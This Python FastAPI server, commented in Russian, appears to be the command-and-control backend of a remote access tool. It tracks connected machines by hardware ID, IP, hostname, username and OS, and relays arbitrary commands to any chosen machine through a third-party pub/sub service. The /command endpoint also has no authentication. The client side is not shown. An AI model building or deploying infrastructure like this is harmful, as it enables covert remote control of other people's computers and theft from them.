import os
import json
import asyncio
import time
from fastapi import FastAPI, WebSocket, HTTPException
from pydantic import BaseModel
from contextlib import asynccontextmanager
import httpx

# ===== Конфигурация Apinator =====
APINATOR_KEY = os.environ.get("APINATOR_KEY")
APINATOR_SECRET = os.environ.get("APINATOR_SECRET")
APINATOR_API_URL = "https://api.apinator.com"
APINATOR_WS_URL = "wss://ws.apinator.com"

if not APINATOR_KEY or not APINATOR_SECRET:
    raise RuntimeError("Apinator credentials not set")

# ===== Состояние сервера =====
clients_info = {}
lock = asyncio.Lock()

# ===== Модели =====
class CommandRequest(BaseModel):
    target: str
    command: dict

# ===== Вспомогательные функции =====
async def publish_to_apinator(channel: str, message: dict):
    async with httpx.AsyncClient() as client:
        resp = await client.post(
            f"{APINATOR_API_URL}/publish",
            json={
                "key": APINATOR_KEY,
                "secret": APINATOR_SECRET,
                "channel": channel,
                "message": message
            },
            timeout=10.0
        )
        if resp.status_code != 200:
            raise Exception(f"Apinator publish error: {resp.text}")
        return resp.json()

async def send_to_client(hwid: str, command: dict):
    await publish_to_apinator(f"client_{hwid}", command)

# ===== Фоновая задача =====
async def apinator_listener():
    import websockets
    uri = f"{APINATOR_WS_URL}?key={APINATOR_KEY}&secret={APINATOR_SECRET}"
    while True:
        try:
            async with websockets.connect(uri) as ws:
                await ws.send(json.dumps({"event": "subscribe", "channel": "presence_global"}))
                async for message in ws:
                    data = json.loads(message)
                    event = data.get("event")
                    if event == "client_connected":
                        hwid = data.get("data", {}).get("hwid")
                        if hwid:
                            async with lock:
                                clients_info[hwid] = {
                                    "ip": data.get("data", {}).get("ip", "Unknown"),
                                    "hostname": data.get("data", {}).get("hostname", "Unknown"),
                                    "username": data.get("data", {}).get("username", "Unknown"),
                                    "os": data.get("data", {}).get("os", "Unknown")
                                }
                    elif event == "client_disconnected":
                        hwid = data.get("data", {}).get("hwid")
                        if hwid:
                            async with lock:
                                clients_info.pop(hwid, None)
        except Exception:
            await asyncio.sleep(5)

# ===== FastAPI =====
@asynccontextmanager
async def lifespan(app: FastAPI):
    task = asyncio.create_task(apinator_listener())
    yield
    task.cancel()

app = FastAPI(lifespan=lifespan)

@app.get("/")
async def index():
    return {"status": "OK"}

@app.get("/health")
async def health():
    return {"status": "healthy"}

@app.get("/clients")
async def get_clients():
    async with lock:
        return list(clients_info.values())

@app.post("/command")
async def send_command(req: CommandRequest):
    try:
        await send_to_client(req.target, req.command)
        return {"status": "ok", "message": "command sent"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    await websocket.send_text("WebSocket on server is deprecated. Use Apinator.")
    await websocket.close()

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
